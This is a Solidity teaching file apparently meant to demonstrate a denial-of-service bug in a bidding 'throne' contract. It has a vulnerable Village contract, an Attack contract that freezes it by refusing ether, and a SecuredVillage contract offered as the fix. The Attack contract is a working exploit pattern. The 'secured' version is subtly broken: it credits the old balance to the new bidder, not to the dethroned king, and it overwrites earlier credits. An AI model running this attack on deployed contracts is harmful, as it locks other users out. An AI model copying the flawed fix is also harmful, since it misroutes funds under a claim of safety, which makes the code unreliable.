// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// exploit a bug in contrat where we deny the service of the contract and the
// functionality got stuck

contract Village {
    address public king;
    uint public balance;

    // the village contract and to get the throne you have to send the more ether
    // as compare to the previous king
    function throne() public payable {
        require(msg.value > balance, "send more ehter to get the throne");

        // PREVENTION : -
        // here we are make a PUSH feature i.e. from our contract we are sending ether to other address
        // instead of this we have to make PULL feature i.e. we will store that how much ether we have to pay
        // to other address can that address will pull his amount
        (bool send, ) = king.call{value: balance}("");
        require(send, "Failed to send ether");

        king = msg.sender;
        balance = msg.value;
    }
}

contract Attack {
    // here we will not define the fallback function so when village contract will send the
    // ether then it will fail
    Village village;

    constructor(address _village) {
        village = Village(_village);
    }

    function attack() public payable {
        village.throne{value: msg.value}();
    }
}

contract SecuredVillage {
    address public king;
    uint public balance;
    mapping(address => uint) withDrawAbleBalance;

    function throne() public payable {
        require(msg.value > balance, "send more ehter to get the throne");

        withDrawAbleBalance[msg.sender] = balance;

        king = msg.sender;
        balance = msg.value;
    }

    // here we have to first update the data then send the ether to user to prevent from reentrancy
    function withDrawAmount() public payable {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = withDrawAbleBalance[msg.sender];
        withDrawAbleBalance[msg.sender] = 0;

        (bool send, ) = msg.sender.call{value: amount}("");
        require(send, "Failed to send the money!!");
    }
}
